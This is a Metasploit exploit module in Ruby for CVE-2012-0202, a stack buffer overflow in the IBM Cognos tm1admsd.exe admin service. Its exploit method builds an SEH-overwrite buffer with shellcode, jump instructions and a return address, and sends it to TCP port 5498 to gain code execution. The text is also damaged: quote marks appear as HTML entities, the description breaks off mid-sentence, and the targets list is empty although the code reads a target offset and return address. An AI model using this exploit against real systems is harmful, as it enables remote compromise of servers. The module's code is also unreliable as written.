# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;IBM Cognos tm1admsd.exe Overflow&#039;,
			&#039;Description&#039;    => %q{
					This module exploits a stack buffer overflow in IBM Cognos Analytic Server
				Admin service. The vulnerability exists in the tm1admsd.exe component, due to a
				dangerous copy of user controlled data to the stack, via memcpy, without validating
				the supplied length and data. The module has been tested successfully on IBM Cognos
			},
			&#039;Author&#039;         =>
				[
					&#039;Unknown&#039;, # Original discovery
					&#039;juan vazquez&#039; # Metasploit module
				],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;References&#039;     =>
				[
					[&#039;CVE&#039;, &#039;2012-0202&#039;],
					[&#039;OSVDB&#039;, &#039;80876&#039;],
					[&#039;BID&#039;, &#039;52847&#039;],
					[&#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-101/&#039;],
					[&#039;URL&#039;, &#039;http://www-01.ibm.com/support/docview.wss?uid=swg21590314&#039;]
				],
			&#039;Privileged&#039;     => true,
			&#039;DefaultOptions&#039; =>
				{
					&#039;SSL&#039; => true,
					&#039;SSLVersion&#039; => &#039;TLS1&#039;
				},
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;    => 10359,
					&#039;DisableNops&#039; => true
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;DefaultTarget&#039;  => 0,
			&#039;Targets&#039;        =>
				[
					# tm1admsd.exe 9.5.10009.10070
					# ret from unicode.nls # call dword ptr ss:[ebp+0x30] # tested over Windows XP SP3 updates
				],
			&#039;DisclosureDate&#039; => &#039;Apr 02 2012&#039;))

			register_options([Opt::RPORT(5498)], self.class)
	end

	def exploit

		sploit = payload.encoded
		sploit << rand_text(target[&#039;Offset&#039;] - sploit.length)
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{target[&#039;Offset&#039;]}").encode_string
		sploit << "\xEB\xF9" + rand_text(2) # jmp $-5
		sploit << [target.ret].pack("V") # seh
		sploit << rand_text(2000) # Trigger exception

		data = rand_text(4)
		data << "\x00\x08" # Opcode
		data << [sploit.length].pack("n") # Length
		data << sploit # Value

		length = [data.length + 2].pack("n")

		req = length
		req << data

		connect
		sock.put(req)
		disconnect

	end
end

